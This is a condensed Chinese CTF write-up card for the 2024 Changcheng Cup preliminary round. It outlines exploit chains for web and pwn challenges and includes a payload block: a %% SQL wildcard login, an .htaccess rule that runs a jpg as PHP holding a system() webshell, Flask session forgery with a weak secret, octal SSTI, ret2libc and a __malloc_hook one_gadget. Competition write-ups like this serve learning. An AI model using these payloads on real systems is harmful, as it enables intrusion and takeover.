---
title: "2024 年第四届\"长城杯\"网络安全大赛（初赛）Writeup"
category: web
tags: ["长城杯", "web", "SQL 通配符登录 %%", ".htaccess 解析 jpg", "tac SUID 提权", "Flask session 伪造"]
signals: ["长城杯 2024", "SQL 通配符登录 %%", ".htaccess 解析 jpg", "tac SUID 提权", "Flask session 伪造", "原型链污染", "SSTI 字母限制 octal", "数字 md5 爆破", "UAF __malloc_hook", "sqli", "file_upload", "rce", "web_unknown", "SQL"]
difficulty: hard
source: "https://www.ctfiot.com/204463.html"
tools: ["Flask"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 年第四届"长城杯"网络安全大赛（初赛）Writeup

> 赛事：长城杯 2024 | 方向：web | 难度：hard | 工具：Flask

## 一句话总结

SQL %% + .htaccess + 数字 md5 爆破 + 原型链污染 + SSTI 八进制 + pwn 3 题。

## 攻击链

1. 1. SQLUP: %% 通配符登录 → 上传 .htaccess (AddType php) + 1.jpg (<?php system) → tac 读 flag (sudo) / 2. CandyShop: flask secret=a123456 爆破 → 伪造 session sold>857 → /admin/view_inventory 模板渲染 + 字母限制 → 八进制 SSTI (octal str \137\137...) 读 secret.txt → 原型链污染 / 3. FlowerShop: 买 2 影星玫瑰+1 卡布奇诺 → 整数溢出改金币 → pop rdi + ret + system("/bin/sh") / 4. consumption: cJSON_Parse 栈溢出覆盖 v13 → 任意地址写 → printf_got 写 heap[1] → show 泄露 libc → edit free_got 改 system → free chunk0 / 5. Kylin_Heap: UAF + unsorted bin 泄露 libc + tcache UAF 改 __malloc_hook 为 one_gadget

## 关键 payload

```
username=admin&password=%% ; .htaccess: AddType application/x-httpd-php .xxx ; flask-unsign --sign --cookie "{''identity'': ''admin'', ''sold'': 857, ''__init__'': {''__globals__'': {''sold'': 857}}}" --secret a123456 ; system("/bin/sh") via ret2libc ; one_gadget 0xe6c81
```

## 经验教训

数字 md5（如 0cc175b9c0f1b6a831c399e269772661 = md5('a')）是单字节爆破关键；Flask secret 弱密钥爆破可伪造 session。

## 标签

SQL 通配符登录 %%、.htaccess 解析 jpg、tac SUID 提权、Flask session 伪造、原型链污染、SSTI 字母限制 octal、数字 md5 爆破、UAF __malloc_hook、one_gadget、cJSON Parse 栈溢出 任意地址写、free_got 改 system

## 参考来源

- https://www.ctfiot.com/204463.html
- 原文件：2024年第四届“长城杯”网络安全大赛_暨京津冀网络安全技能竞赛（初赛）Writeup.full.md
